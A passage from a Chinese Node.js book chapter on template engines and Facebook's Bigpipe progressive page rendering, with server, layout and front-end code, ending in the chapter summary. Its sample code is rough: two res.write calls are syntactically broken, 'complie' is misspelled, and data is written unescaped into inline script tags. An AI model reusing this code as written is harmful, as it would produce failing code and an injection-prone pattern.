模板技术的出现，将业务开发与HTML输出的工作分离开来，它的设计原理就是单一职责原理。这与MVC中的数据、逻辑、视图分离如出一辙，更与前端HTML、CSS、JavaScript分离的设计理念一致，让视觉、结构、逻辑分离开来。随着Node的出现，模板能够在前后端共用实在是太寻常不过的事情，甚至都不用去重复实现引擎。本节介绍了模板的基本原理，如今各种各样的模板具备不同的特性和性能。最知名的有EJS、Jade等，它们在模板语言的设计上各不相同，EJS是ASP、PHP、JSP风格的模板标签，Jade则类似Python、Ruby的风格。

本节介绍了模板技术的实现细节，读者可以按照本节的思路实现自己的模板引擎，也可以使用EJS、Jade等成熟的模板引擎，除了上述提及的，还有过滤器等功能。

#### Bigpipe

这个名词与在第4章中提到的Bagpipe比较相似，不过Bagpipe的翻译为风笛，是用于调用限流的。此处的Bigpipe是产生于Facebook公司的前端加载技术，它的提出主要是为了解决重数据页面的加载速度问题，在2010年的Velocity会议上，当时来自Facebook的蒋长浩先生分享了该议题，随后引起了国内业界巨大的反响。

这里以一个简单的例子说明下前文提到的MVC和模板技术潜在的问题：

```js
app.get('/profile',
function(req, res) {
  db.getData('sql1',
  function(err, users) {
    db.getData('sql2',
    function(err, articles) {
      res.render('user', {
        layout: 'layout.html',
        users: users,
        articles: articles
      });
    });
  });
});
```
这个例子中，我们渲染profile页面需要获取users和articles数据，然后通过布局文件layout和模板文件user，最终发出页面到浏览器端。排除掉模板文件和布局文件可能同步的影响，将无依赖的数据获取通过EventProxy解开，如下所示：

```js
app.get('/profile',
function(req, res) {
  var ep = new EventProxy();
  ep.all('users', 'articles',
  function(users, articles) {
    res.render('user', {
      layout: 'layout.html',
      users: users,
      articles: articles
    });
  });
  ep.fail(function(err) {
    res.render('err', {
      message: err.message
    });
  });
  db.getData('sql1', ep.done('users'));
  db.getData('sql2', ep.done('articles'));
});
```
至此还存在的问题是什么？

问题在于我们的页面，最终的HTML要在所有的数据获取完成后才输出到浏览器端。Node通过异步已经将多个数据源的获取并行起来了，最终的页面输出速度取决于两个数据请求中响应时间慢的那个。在数据响应之前，用户看到的是空白页面，这是十分不友好的用户体验。

Bigpipe的解决思路则是将页面分割成多个部分（pagelet），先向用户输出没有数据的布局（框架），将每个部分逐步输出到前端，再最终渲染填充框架，完成整个网页的渲染。这个过程中需要前端JavaScript的参与，它负责将后续输出的数据渲染到页面上。

Bigpipe是一个需要前后端配合实现的优化技术，这个技术有几个重要的点。

- 页面布局框架（无数据的）。
- 后端持续性的数据输出。
- 前端渲染。

Bigpipe的渲染流程示意图如图8-8所示。

![Bigpipe的渲染流程示意图](https://graphbed.qiniu.songxingguo.com/Node-Web-App/Bigpipe%E7%9A%84%E6%B8%B2%E6%9F%93%E6%B5%81%E7%A8%8B%E7%A4%BA%E6%84%8F%E5%9B%BE.jpg)

1. 页面布局框架

页面布局框架依然由后端渲染而出，如下所示：

```js
var cache = {};
var layout = 'layout.html';
app.get('/profile',
function(req, res) {
  if (!cache[layout]) {
    cache[layout] = fs.readFileSync(path.join(VIEW_FOLDER, layout), 'utf8');
  }
  res.writeHead(200, {
    'Content-Type': 'text/html'
  });
  res.write(render(complie(cache[layout]))); // TODO 
});
```
这个布局文件中要引入必要的前端脚本，如jQuery、Underscore等常用库，其次要引入我们重要的前端脚本，这里的文件名为bagpipe.js。整体模板文件如下所示：

```html
<html>
 <head></head>
 <body>
  // layout.html    
  <title>Bagpipe示例</title> 
  <script src="jquery.js"></script> 
  <script src="underscore.js"></script> 
  <script src="bigpipe.js"></script>   
  <div id="body"></div> 
  <script type="text/template" id="tpl_body"> <div><%=articles%></div> 
</script> 
  <div id="footer"></div> 
  <script type="text/template" id="tpl_footer"> <div><%=users%></div> 
</script>   
  <script> 
    var bigpipe = new Bigpipe();
    bigpipe.ready('articles',
    function(data) {
      $('#body').html(_.render($('#tpl_body').html(), {
        articles: data
      }));
    });
    bigpipe.ready('copyright',
    function(data) {
      $('#footer').html(_.render($('#tpl_footer').html(), {
        users: data
      }));
    });
  </script>
 </body>
</html>
```

2. 持续数据输出

模板输出后，整个网页的渲染并没有结束，但用户已经可以看到整个页面的大体样子。接下来我们继续数据输出，与普通的数据输出不同，这里的数据输出之后需要被前端脚本处理，是故需要对它进行封装处理，如下所示：

```js
app.get('/profile',
function(req, res) {
    if (!cache[layout]) {
        cache[layout] = fs.readFileSync(path.join(VIEW_FOLDER, layout), 'utf8');
    }
    res.writeHead(200, {
        'Content-Type': 'text/html'
    });
    res.write(render(complie(cache[layout])));
    ep.all('users', 'articles',
    function() {
        res.end();
    });
    ep.fail(function(err) {
        res.end();
    });
    db.getData('sql1',
    function(err, data) {
        data = err ? {}: data;
        res.write('<script>bigpipe.set("articles", ' + JSON.stringify(data) + ');</script>';
    }); db.getData('sql2',
    function(err, data) {
        data = err ? {}: data;
        res.write('<script>bigpipe.set("copyright", ' + JSON.stringify(data) + ');</script>';
    });
});
```
对于需要渲染到页面上的数据，它的封装如下：

```js
res.write('<script>bigpipe.set("articles", ' + JSON.stringify(data) + ');</script>';
```
这样最终HTML代码的尾巴上还应该有如下这样的代码：

```html
<script>bigpipe.set("articles", "I am article");</script> 
<script>bigpipe.set("copyright", "I am copyright");</script>
```
这两行代码的顺序取决于谁先完成两次异步调用。由于Node非阻塞的特性，多次异步调用可以并行执行，谁先结束谁就可以快速推送到HTML页面上，随着前端脚本的执行，就可以更快地渲染到页面上。

相比Facebook原始的Bigpipe应用在PHP这类阻塞式环境中，Node在数据获取上可以并行进行，使得Bigpipe更具效果。

3. 前端渲染

前文的bigpipe.ready()和bigpipe.set()是整个前端的渲染机制，前者以一个key注册一个事件，后者则触发一个事件，以此完成页面的渲染机制。这两个函数定义在bigpipe.js文件中，如下所示：

```js
var Bigpipe = function() {
    this.callbacks = {};
};
Bigpipe.prototype.ready = function(key, callback) {
    if (!this.callbacks[key]) {
        this.callbacks[key] = [];
    }
    this.callbacks[key].push(callback);
};
Bigpipe.prototype.set = function(key, data) {
    var callbacks = this.callbacks[key] || [];
    for (var i = 0; i < callbacks.length; i++) {
        callbacks[i].call(this, data);
    }
};
```

4. 小结

Bigpipe将网页布局和数据渲染分离，使得用户在视觉上觉得网页提前渲染好了，其随着数据输出的过程逐步渲染页面，使得用户能够感知到页面是活的。这远比一开始给出空白页面，然后在某个时候突然渲染好带给用户的体验更好。Node在这个过程中，其异步特性使得数据的输出能够并行，数据的输出与数据调用的顺序无关，越早调用完的数据可以越早渲染到页面中，这个特性使得Bigpipe更趋完美。

要完成Bigpipe这样逐步渲染页面的过程，其实通过Ajax也能完成，但是Ajax的背后是HTTP调用，要耗费更多的网络连接，Bigpipe获取数据则与当前页面共用相同的网络连接，开销十分小。

完成Bigpipe所要涉及的细节较多，比MVC中的直接渲染要复杂许多，建议在网站重要的且数据请求时间较长的页面中使用。

### 总结


本章涉及的内容较为丰富，在Web应用的整个构建过程中，从处理请求到响应请求的整个过程都有原理性阐述，整理本章细节就可以完成一个功能完备的Web开发框架。过去的各种Web技术，随着框架和库的成型，开发者往往迷糊地知道应用框架和库，却不知道细节的实现，这好比没有地图却在野地里行进。本章的内容希望能为Node开发者带来地图似的启发，在开发Web应用时能够心有轮廓，明了细微。

现在知名和成熟的Web框架有Connect、Express等，本章中的内容在这些框架中都有实现，因为行文的原因，本章中的代码实现得较为粗糙，实际使用请使用这些成熟的框架。